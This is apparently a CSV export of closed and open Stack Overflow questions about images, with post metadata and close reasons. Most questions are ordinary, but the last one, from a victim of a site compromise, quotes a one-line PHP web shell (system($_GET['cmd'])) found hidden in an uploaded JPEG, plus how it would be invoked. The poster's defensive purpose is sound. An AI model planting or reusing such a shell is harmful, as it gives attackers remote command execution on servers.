PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
8478685,12/12/2011 18:01:03,1094269,12/12/2011 17:45:27,1,0,Change DIV background image on .hover - with fade,"I'm looking to fade from one background image to another using a standard .hover link.

An example of the link without the fade can be seen here:
http://www.makestudio.co.uk/sites/seven/

Other pages within the site will use similar layout only different background images for the links. Any help would be amazing.",image,background,hover,fade,,,open,0,46,9,"Change DIV background image on .hover - with fade I'm looking to fade from one background image to another using a standard .hover link.

An example of the link without the fade can be seen here:
http://www.makestudio.co.uk/sites/seven/

Other pages within the site will use similar layout only different background images for the links. Any help would be amazing.",4
7726590,10/11/2011 13:13:20,989564,10/11/2011 13:07:59,1,0,log-polar coordinates (or logarithmic polar coordinates) VS polar coordinates,Why do you so often use LOG-polar coordinates? What is so useful about them. Can't we do the exact same things with polar coordinates? (for example in image processing),image,logging,registration,processing,,03/29/2012 08:33:18,not a real question,1,29,9,log-polar coordinates (or logarithmic polar coordinates) VS polar coordinates Why do you so often use LOG-polar coordinates? What is so useful about them. Can't we do the exact same things with polar coordinates? (for example in image processing),4
3863674,10/05/2010 12:40:41,131640,07/01/2009 11:19:16,884,20,Image Color Picking Script,"I have a bunch of sports team logos.  What I want to do is find the color that is used for the highest percentage of pixels.  So, for the patriots logo below, I would pick out the blue or #000f47, as this is used for the highest percentage of pixels.  Obviously I can eyeball each image, use the color picker tool in Gimp/Photoshop, and determine the color.  However, I would like to script this if possible.  

I can use any format for the picture input.  Would it be possible to read the raw bitmap file format and determine this way?  What would be an easy format to read?  Do any tools support this, like ImageMagick, etc?  

![alt text][1]


  [1]: http://i.stack.imgur.com/eDvhp.png

Thanks",image,image-processing,png,imagemagick,jpeg,,open,0,130,4,"Image Color Picking Script I have a bunch of sports team logos.  What I want to do is find the color that is used for the highest percentage of pixels.  So, for the patriots logo below, I would pick out the blue or #000f47, as this is used for the highest percentage of pixels.  Obviously I can eyeball each image, use the color picker tool in Gimp/Photoshop, and determine the color.  However, I would like to script this if possible.  

I can use any format for the picture input.  Would it be possible to read the raw bitmap file format and determine this way?  What would be an easy format to read?  Do any tools support this, like ImageMagick, etc?  

![alt text][1]


  [1]: http://i.stack.imgur.com/eDvhp.png

Thanks",5
8119493,11/14/2011 09:26:36,592089,01/27/2011 11:30:00,1,0,Feedback about my Image Hoster,"I need a feedback about my Image Hoster:
http://www.yourimage24.de

Feedback about the following points:
- look and feel
- web 2.0
- user-friendliness
- improvement
- seo

and your own impression ;-)

Thanks",image,upload,hosting,online,,11/14/2011 10:01:51,off topic,1,24,5,"Feedback about my Image Hoster I need a feedback about my Image Hoster:
http://www.yourimage24.de

Feedback about the following points:
- look and feel
- web 2.0
- user-friendliness
- improvement
- seo

and your own impression ;-)

Thanks",4
8514246,12/15/2011 02:03:57,1090769,12/10/2011 02:02:44,1,0,Why won't my images work?,"I just started a new site on my new laptop and after writing in the content i checked it on Google Chrome. None of my images worked. The urls are all good but it's just not working. My code is below. I feel kinda dumb cause it's probably gonna be something really simple. Let me know what you think. Thanks!

<**img src='images/logo.gif' alt='dylanbuth.us' /**>

I have a 64bit computer and 32bit chrome. Does that matter? I don't think so but might as well be thorough.",image,,,,,12/15/2011 17:12:51,not a real question,1,83,5,"Why won't my images work? I just started a new site on my new laptop and after writing in the content i checked it on Google Chrome. None of my images worked. The urls are all good but it's just not working. My code is below. I feel kinda dumb cause it's probably gonna be something really simple. Let me know what you think. Thanks!

<**img src='images/logo.gif' alt='dylanbuth.us' /**>

I have a 64bit computer and 32bit chrome. Does that matter? I don't think so but might as well be thorough.",1
5552840,04/05/2011 13:44:14,693004,04/05/2011 13:44:14,1,0,convert .jpg from an url to .png format,"i had a look in the answer of converting gif from url to png , but it didnt work for me.",image,url,,,,04/05/2011 14:03:09,not a real question,1,21,8,"convert .jpg from an url to .png format i had a look in the answer of converting gif from url to png , but it didnt work for me.",2
11718644,07/30/2012 09:26:17,1562422,07/30/2012 09:00:43,1,0,post image to server without browsing,I am developing examination system in php. Pass/fail percentage is shown throught pie chart using google charg api. I have to generate a report in pdf format that includes this pie chart as well. Now my problem is how to generate image from pie chart so that I could include it in pdf format. Also I need to upload generated image file to the server directly without browsing. I have no idea how to do it. Please provide me with the solution. Thanks in advance.,image,pdf,upload,charts,,07/31/2012 02:28:04,not a real question,1,85,6,post image to server without browsing I am developing examination system in php. Pass/fail percentage is shown throught pie chart using google charg api. I have to generate a report in pdf format that includes this pie chart as well. Now my problem is how to generate image from pie chart so that I could include it in pdf format. Also I need to upload generated image file to the server directly without browsing. I have no idea how to do it. Please provide me with the solution. Thanks in advance.,4
10841224,05/31/2012 21:02:38,1354448,04/24/2012 18:02:10,15,0,What is a good way for me to build a scalable application that does a lot of image processing?,"I am building an application that deals with a lot of images and we need to process every image to apply various transformations such as scaling/resizing, filters, etc. How should I build that in such a way that it can scale as we grow and I won't need to go through the growing pains like Instagram and others had to do?

BTW, we're using ImageMagick right now process the images. 
",image,image-processing,imagemagick,image-manipulation,,06/02/2012 04:02:41,not constructive,1,70,19,"What is a good way for me to build a scalable application that does a lot of image processing? I am building an application that deals with a lot of images and we need to process every image to apply various transformations such as scaling/resizing, filters, etc. How should I build that in such a way that it can scale as we grow and I won't need to go through the growing pains like Instagram and others had to do?

BTW, we're using ImageMagick right now process the images. 
",4
9280765,02/14/2012 16:48:07,1209555,02/14/2012 16:39:59,1,0,how to generate fractal image with java?,"I'm do not have any experience with programming fractals.i want to study about fractal image compression,but before i started it, i just want to know how to generate fractal image in java language. such as leaves, mountain, etc



Thanks",image,generate,fractals,,,02/15/2012 04:41:41,not a real question,1,38,7,"how to generate fractal image with java? I'm do not have any experience with programming fractals.i want to study about fractal image compression,but before i started it, i just want to know how to generate fractal image in java language. such as leaves, mountain, etc



Thanks",3
419584,01/07/2009 08:35:37,38997,11/19/2008 16:27:24,352,14,"What is the difference between ""JPG"" / ""JPEG"" / ""PNG"" / ""BMP"" / ""GIF"" / ""TIFF"" Image?","I have seen many types of image (extension) but have never understood the real difference between them. Are there any links out there that clearly explains the difference between them.

Is there a standard to use a particular type of image in your application? What do we use for web applications?

",image,difference,,,,,open,0,50,17,"What is the difference between ""JPG"" / ""JPEG"" / ""PNG"" / ""BMP"" / ""GIF"" / ""TIFF"" Image? I have seen many types of image (extension) but have never understood the real difference between them. Are there any links out there that clearly explains the difference between them.

Is there a standard to use a particular type of image in your application? What do we use for web applications?

",2
6217458,06/02/2011 16:39:14,692280,04/05/2011 05:50:26,38,6,Break a Multi-Page Tif to Individual Pages : Flow,"I came to ask the right process flow for breaking a multi-page tiff image. I just can't figure out how to start the process flow. Right now, the thing that comes in my mind is breaking the tiff to separate pages, but i don't know the process behind it. Maybe you guys can give me an idea on how to do it.

Thanks in advance.

Cheers!",image,process,tiff,flow,,06/02/2011 18:18:11,not a real question,1,64,9,"Break a Multi-Page Tif to Individual Pages : Flow I came to ask the right process flow for breaking a multi-page tiff image. I just can't figure out how to start the process flow. Right now, the thing that comes in my mind is breaking the tiff to separate pages, but i don't know the process behind it. Maybe you guys can give me an idea on how to do it.

Thanks in advance.

Cheers!",4
3499173,08/17/2010 03:44:29,301584,03/25/2010 10:18:09,31,0,My php site was hacked by codes uploaded as image..?!,"Yesterday my site was comprised. The attacker changes the index.php file to their own (with all their glory messages and greet). I've notified the hosting company about this (we are running on a dedicated server), and on my part, I'm trying to fix anything that seems to be the cause, cause I'm still unable to point how exactly did our server was attacked, but I think I've found certain script-based loopholes that could possibly be the culprit.

Our site has an image uploader form, but all uploaded images are verified if they're indeed image file and not some codes by using php getimagesize function. Only if the image type is IMAGETYPE_GIF, or IMAGETYPE_JPEG, or IMAGETYPE_PNG will they be accepted. Else, they won't be able to upload the file. However I found out that one uploaded image file contains a php script inside it! You can download the image <a href=""http://img132.imageshack.us/img132/6365/picodes.jpg"">here</a>. It's a valid image file, but try opening the image using any text editor and you will find a php code inside it:

    <?php

    echo ""<pre>""; system($_GET['cmd']); echo ""</pre>"";

    ?>

For example, the image is uploaded to this location (www.mysite.com/uploads/picodes.jpg). Take note that folder uploads' permission is 755. Is there any way in the world the attacker can execute the system (or any other command such as passthru, since we found out another image has the same code hidden as above, but instead of system, it has passthru command), by just for example, typing <b>www.mysite.com/uploads/picodes.jpg?cmd=some command</b> ?? From my knowledge it can't be done (really appreciate it if someone can prove me wrong), unless the attacker can rename the jpg file to php, and even that, these codes are hidden deep inside the image (please see the image inside text editor to understand what I'm trying to say)

For precautions, I've disabled these php functions (exec, passthru, proc_close,proc_get_status,proc_nice,proc_open,proc_terminate,shell_exec,system) by adding them on the disable_functions in php.ini.

Anyway I still think that the attacker gains access not through web, but through server exploit, but I think my hosting company thinks otherwise.

Thanks a lot!",image,upload,exec,hack,exploit,,open,0,347,10,"My php site was hacked by codes uploaded as image..?! Yesterday my site was comprised. The attacker changes the index.php file to their own (with all their glory messages and greet). I've notified the hosting company about this (we are running on a dedicated server), and on my part, I'm trying to fix anything that seems to be the cause, cause I'm still unable to point how exactly did our server was attacked, but I think I've found certain script-based loopholes that could possibly be the culprit.

Our site has an image uploader form, but all uploaded images are verified if they're indeed image file and not some codes by using php getimagesize function. Only if the image type is IMAGETYPE_GIF, or IMAGETYPE_JPEG, or IMAGETYPE_PNG will they be accepted. Else, they won't be able to upload the file. However I found out that one uploaded image file contains a php script inside it! You can download the image <a href=""http://img132.imageshack.us/img132/6365/picodes.jpg"">here</a>. It's a valid image file, but try opening the image using any text editor and you will find a php code inside it:

    <?php

    echo ""<pre>""; system($_GET['cmd']); echo ""</pre>"";

    ?>

For example, the image is uploaded to this location (www.mysite.com/uploads/picodes.jpg). Take note that folder uploads' permission is 755. Is there any way in the world the attacker can execute the system (or any other command such as passthru, since we found out another image has the same code hidden as above, but instead of system, it has passthru command), by just for example, typing <b>www.mysite.com/uploads/picodes.jpg?cmd=some command</b> ?? From my knowledge it can't be done (really appreciate it if someone can prove me wrong), unless the attacker can rename the jpg file to php, and even that, these codes are hidden deep inside the image (please see the image inside text editor to understand what I'm trying to say)

For precautions, I've disabled these php functions (exec, passthru, proc_close,proc_get_status,proc_nice,proc_open,proc_terminate,shell_exec,system) by adding them on the disable_functions in php.ini.

Anyway I still think that the attacker gains access not through web, but through server exploit, but I think my hosting company thinks otherwise.

Thanks a lot!",5
